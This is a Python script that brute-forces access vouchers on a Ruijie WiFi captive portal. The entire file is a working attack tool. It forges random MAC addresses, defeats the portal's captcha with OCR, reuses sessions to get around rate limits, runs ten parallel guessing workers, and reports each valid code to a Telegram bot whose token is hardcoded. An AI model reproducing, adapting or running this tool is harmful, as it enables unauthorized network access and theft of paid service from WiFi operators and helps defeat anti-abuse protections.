#!/usr/bin/env python3
"""
Ruijie WiFi Code Scanner - Fast version
Session reuse: 1 captcha solve → many code checks (10-50x faster)
"""
import asyncio, aiohttp, re, time, random, string, sys, os, io

BOT_TOKEN   = os.environ.get("BOT_TOKEN",  "8915737207:AAFymbnH_1Ga39WrcoRmfhca73hGhwF4kzY")
CHAT_ID     = os.environ.get("CHAT_ID",    "5406128711")
SESSION_URL = os.environ.get("SESSION_URL", "")

CODE_LEN    = 6
WORKERS     = 10        # more workers = faster
BATCH_SIZE  = 50        # codes per session before refreshing

PORTAL      = "https://portal-as.ruijienetworks.com"
VOUCHER_URL = PORTAL + "/api/auth/voucher/?lang=en_US"

found_codes = []
checked     = 0
start_time  = time.time()

def random_mac():
    return ":".join(f"{random.randint(0,255):02x}" for _ in range(6))

def replace_mac(url, mac):
    return re.sub(r'mac=[^&]+', f'mac={mac}', url)

async def tg_send(text):
    try:
        async with aiohttp.ClientSession() as s:
            await s.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"},
                timeout=aiohttp.ClientTimeout(total=10)
            )
    except:
        pass

async def get_session_id(session, session_url):
    mac = random_mac()
    url = replace_mac(session_url, mac)
    hdrs = {"user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"}
    try:
        async with session.get(url, headers=hdrs, allow_redirects=True,
                               timeout=aiohttp.ClientTimeout(total=10)) as r:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(r.url))
            return sid.group(1) if sid else None
    except:
        return None

async def get_captcha_image(session, sid):
    params = {"sessionId": sid, "_t": str(time.time())}
    hdrs = {
        "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36",
        "referer": f"{PORTAL}/download/static/maccauth/src/index.html?sessionId={sid}",
    }
    try:
        async with session.get(f"{PORTAL}/api/auth/captcha/image",
                               params=params, headers=hdrs,
                               timeout=aiohttp.ClientTimeout(total=10)) as r:
            return await r.read()
    except:
        return None

async def verify_captcha(session, sid, text):
    hdrs = {
        "content-type": "application/json",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36",
        "referer": f"{PORTAL}/download/static/maccauth/src/index.html?sessionId={sid}",
    }
    try:
        async with session.post(f"{PORTAL}/api/auth/captcha/verify",
                                json={"sessionId": sid, "authCode": text},
                                headers=hdrs,
                                timeout=aiohttp.ClientTimeout(total=10)) as r:
            d = await r.json()
            return d.get("success") == True
    except:
        return False

def solve_captcha(image_bytes):
    try:
        from PIL import Image, ImageFilter, ImageEnhance
        import pytesseract
        img = Image.open(io.BytesIO(image_bytes)).convert("L")
        img = img.resize((img.width * 3, img.height * 3), Image.LANCZOS)
        img = ImageEnhance.Contrast(img).enhance(3.0)
        img = img.filter(ImageFilter.SHARPEN)
        img = img.point(lambda x: 0 if x < 128 else 255, '1')
        text = pytesseract.image_to_string(
            img,
            config='--psm 8 --oem 3 -c tessedit_char_whitelist=0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
        )
        return ''.join(text.strip().split())[:6] or None
    except:
        return None

async def get_valid_session(session, session_url):
    """Get sessionId + verified authCode. Retry until success."""
    for _ in range(20):
        sid = await get_session_id(session, session_url)
        if not sid:
            await asyncio.sleep(1)
            continue
        for _ in range(10):
            img = await get_captcha_image(session, sid)
            if not img:
                continue
            text = solve_captcha(img)
            if not text:
                await asyncio.sleep(0.2)
                continue
            if await verify_captcha(session, sid, text):
                return sid, text
            await asyncio.sleep(0.2)
        await asyncio.sleep(0.5)
    return None, None

async def check_voucher(session, sid, auth_code, code, hdrs):
    """Check one voucher code. Returns: 'found' | 'captcha_error' | 'rate_limit' | 'invalid'"""
    data = {"accessCode": code, "sessionId": sid, "apiVersion": 1, "authCode": auth_code}
    try:
        async with session.post(VOUCHER_URL, json=data, headers=hdrs,
                                timeout=aiohttp.ClientTimeout(total=15)) as r:
            body = await r.text()
            if "logonUrl" in body:
                return "found"
            if "request limited" in body:
                return "rate_limit"
            if "captcha" in body.lower() or "authCode" in body:
                return "captcha_error"
            return "invalid"
    except:
        return "error"

async def worker(queue, session_url, worker_id):
    global checked, found_codes
    hdrs = {
        "content-type": "application/json",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36",
        "origin": PORTAL,
        "referer": f"{PORTAL}/download/static/maccauth/src/index.html",
    }

    async with aiohttp.ClientSession(cookie_jar=aiohttp.CookieJar()) as session:
        while True:
            # Get a valid session (reuse for BATCH_SIZE codes)
            sid, auth = await get_valid_session(session, session_url)
            if not sid:
                print(f"[W{worker_id}] Cannot get session, retrying...")
                await asyncio.sleep(3)
                continue

            print(f"[W{worker_id}] Session OK → checking {BATCH_SIZE} codes")

            for _ in range(BATCH_SIZE):
                code = await queue.get()
                if code is None:
                    queue.task_done()
                    return

                result = await check_voucher(session, sid, auth, code, hdrs)
                checked += 1

                if result == "found":
                    found_codes.append(code)
                    msg = f"✅ <b>FOUND: {code}</b>\n⏱ {time.strftime('%H:%M:%S')}"
                    print(f"\n{'='*40}\n✅ FOUND: {code}\n{'='*40}")
                    await tg_send(msg)

                elif result in ("captcha_error", "rate_limit"):
                    queue.task_done()
                    await asyncio.sleep(1 if result == "captcha_error" else 3)
                    break  # refresh session

                elif result == "error":
                    await asyncio.sleep(0.5)

                queue.task_done()

def code_generator():
    chars = string.digits + string.ascii_uppercase
    while True:
        yield ''.join(random.choices(chars, k=CODE_LEN))

async def progress_printer():
    global checked
    prev = 0
    prev_time = time.time()
    while True:
        await asyncio.sleep(30)
        now = time.time()
        rate = (checked - prev) / (now - prev_time)
        elapsed = int(now - start_time)
        print(f"[scan] checked={checked} | speed={rate:.1f}/s | found={len(found_codes)} | {elapsed}s elapsed")
        await tg_send(f"📊 checked={checked} | speed={rate:.1f}/s | found={len(found_codes)}")
        prev = checked
        prev_time = now

async def main():
    session_url = SESSION_URL
    if not session_url:
        session_url = input("Ruijie URL ထည့်ပါ: ").strip()
    if not session_url:
        sys.exit("URL မပေး — ထွက်မည်")

    print(f"[scan] Workers={WORKERS} | BatchSize={BATCH_SIZE} | CodeLen={CODE_LEN}")
    print(f"[scan] Starting... found codes → Telegram chat")
    await tg_send(f"🚀 <b>Scan started</b>\nWorkers: {WORKERS} | Batch: {BATCH_SIZE}\nEach worker reuses session for {BATCH_SIZE} codes before refreshing captcha.")

    queue = asyncio.Queue(maxsize=WORKERS * 10)
    workers = [asyncio.create_task(worker(queue, session_url, i+1)) for i in range(WORKERS)]
    progress = asyncio.create_task(progress_printer())
    stop = asyncio.Event()

    async def feeder():
        gen = code_generator()
        for code in gen:
            if stop.is_set():
                break
            await queue.put(code)
        for _ in range(WORKERS):
            await queue.put(None)

    feed = asyncio.create_task(feeder())
    try:
        await asyncio.gather(*workers)
    except (KeyboardInterrupt, asyncio.CancelledError):
        stop.set()
        feed.cancel()

    progress.cancel()
    total = int(time.time() - start_time)
    summary = f"🏁 Done | checked={checked} | found={len(found_codes)} | {total}s"
    print(f"\n{summary}")
    await tg_send(summary)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[scan] Stopped by user")
